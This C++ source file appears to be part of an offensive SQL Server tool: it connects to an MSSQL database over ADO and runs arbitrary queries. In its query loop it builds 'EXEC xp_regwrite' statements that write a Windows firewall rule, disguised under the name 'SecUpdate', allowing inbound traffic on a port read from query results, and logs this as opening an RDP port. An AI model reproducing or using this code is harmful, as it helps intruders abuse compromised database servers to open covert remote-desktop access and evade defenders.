#include "DataSourceHandle.h"

//类外定义，静态对象声明时不分配内存，只有定义才分配
//DataSourceHandle* DataSourceHandle::m_DataSourceHandle = nullptr;

DataSourceHandle::DataSourceHandle(){

	HRESULT hr;
	hr = CoInitialize(NULL);
	if (FAILED(hr))
	{
		throw "com init faild.\n";
	}
	hr = m_pConn.CreateInstance(__uuidof(Connection));
	if (FAILED(hr))
	{
		throw "Connection create faild!\n";
	}
	hr = m_pCommand.CreateInstance(__uuidof(Command));
	if (FAILED(hr))
	{
		throw "Command Create faild!\n";
	}
	hr = m_pRecordset.CreateInstance(__uuidof(Recordset));
	if (FAILED(hr))
	{
		throw "Recordset Create faild!\n";
	}

}
//DataSourceHandle* DataSourceHandle::getInstance()
//{
//	return new DataSourceHandle();
//}

bool DataSourceHandle:: basequery(string sql)
{
	m_pCommand->ActiveConnection = m_pConn;
	try
	{
		m_pCommand->CommandText = bstr_t(sql.c_str());
		m_pCommand->CommandType = adCmdText;
		m_pRecordset=m_pCommand->Execute(nullptr, nullptr, adCmdText);

		//m_pRecordset->Requery(adCmdUnknown);
		m_pRecordset->MoveFirst();

		if (m_pRecordset->adoEOF)
		{
			return false;
		}
		else {

			_bstr_t val;
			_variant_t var;
			char* result;
			while (!(m_pRecordset->adoEOF))
			{
				//printf("%p", m_pRecordset->GetCollect((long)0));
				//可能没必要
				/*if (typeid(m_pRecordset->GetCollect((long)0))==typeid(_bstr_t))
				{
					val = m_pRecordset->GetCollect((long)0);
					cout << (char*)val << endl;
					m_pRecordset->MoveNext();
				}
				else if (typeid(m_pRecordset->GetCollect((long)0))==typeid(_variant_t))
				{*/
				
				try
				{
					var = m_pRecordset->GetCollect((long)1);
					//加防火墙规则
					//高度耦合
					ostringstream oss;
					val = _bstr_t(var);
					result = (char*)val;
					if (result!=NULL)
					{
						oss << "EXEC xp_regwrite 'HKEY_LOCAL_MACHINE', 'SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules', '{3A8D3F89-43F9-D3F9-3AF9-33E93F89A38B}', 'REG_SZ', 'v2.10|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort=" << result << "|Name=SecUpdate|';";
						DataSourceHandle::justquery(oss.str());
						cout << "[*]write RDP port to firewall rule." << endl;
					}
					
				}
				catch (_com_error e)
				{
					var = m_pRecordset->GetCollect((long)0);
				}
					
				//解决不了类型不符的异常了，只能这样了
					try
					{
						val = _bstr_t(var);
					}
					catch (_com_error e)
					{
						cout << endl;
						m_pRecordset->MoveNext();
						continue;
					}
					result = (char*)val;
					cout << result<< endl;
					m_pRecordset->MoveNext();
					continue;
				//}
			}

		}


	}
	catch (_com_error e)
	{
		cout << e.Description() << endl;
		return false;
	}

	return true;
}


void DataSourceHandle::builddsn(string host, string port,string dbname)
{
	
	ostringstream oss;
	//oss << "User ID=" << username << ";Password=" << password << ";Data Source=" << host << ";Provider=SQLOLEDB;Initial Catalog=" << dbname;
	//oss<< "Provider=SQLOLEDB;Data Source="<<host<<";Initial Catalog="<<dbname<<";User ID="<<username<<";Password="<<password;
	oss << "Provider=SQLOLEDB;Data Source=" << host <<","<<port<< ";Initial Catalog=" << dbname;
	conndsn = oss.str();
	return;
}

bool DataSourceHandle::connect(string username,string password)
{
	
	//if (true){
	try
	{		
		m_pConn->CommandTimeout = 8;//超时时间
		if (!FAILED(m_pConn->Open(_bstr_t(conndsn.c_str()), _bstr_t(username.c_str()), _bstr_t(password.c_str()), adModeUnknown)))
		{
			return true;
		}
	}
	catch (_com_error e)
	{
		cout << e.Description() << endl;
		return false;
	}
		

	

	return false;
}

void DataSourceHandle::justquery(string sql)
{
	m_pCommand->ActiveConnection = m_pConn;
	try
	{
		m_pCommand->CommandText = bstr_t(sql.c_str());
		m_pCommand->CommandType = adCmdText;
		m_pCommand->Execute(nullptr, nullptr, adCmdText);

	}
	catch (_com_error e)
	{
		cout << e.Description() << endl;
		return;
	}

	return;
}

//void DataSourceHandle::printresult()
//{
//
//	
//
//	try
//	{
//		m_pRecordset->Requery(adCmdUnknown);
//		m_pRecordset->MoveFirst();
//	}
//	catch (_com_error e)
//	{
//		cout << e.Description() << endl;
//		return;
//	}
//
//	if (m_pRecordset->adoEOF)
//	{
//		return;
//	}
//	else {
//	
//		_bstr_t val;
//		while (!(m_pRecordset->adoEOF))
//		{
//			val=m_pRecordset->GetCollect((long)0);
//			cout << val.GetBSTR() << endl;
//		}
//	
//	}
//
//
//}

DataSourceHandle::~DataSourceHandle() {

	m_pConn->Close();
	CoUninitialize();

}